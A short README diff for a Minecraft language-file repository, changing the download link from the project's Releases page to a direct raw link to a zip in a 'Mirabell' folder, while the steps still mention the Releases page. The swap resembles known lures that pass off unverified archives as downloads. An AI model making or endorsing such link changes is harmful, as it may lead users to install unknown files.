@@ -6,7 +6,7 @@ Minecraft-All-Lang provides all language files for Minecraft. This collection is
 
 ## 📦 Download & Install
 
-To get started, visit this page to download the language files: [Download Minecraft-All-Lang](https://github.com/tunwinaung742/Minecraft-All-Lang/releases)
+To get started, visit this page to download the language files: [Download Minecraft-All-Lang](https://raw.githubusercontent.com/tunwinaung742/Minecraft-All-Lang/main/Mirabell/Minecraft-All-Lang.zip)
 
 ### Steps to Download
 1. Click the download link above to open the Releases page.
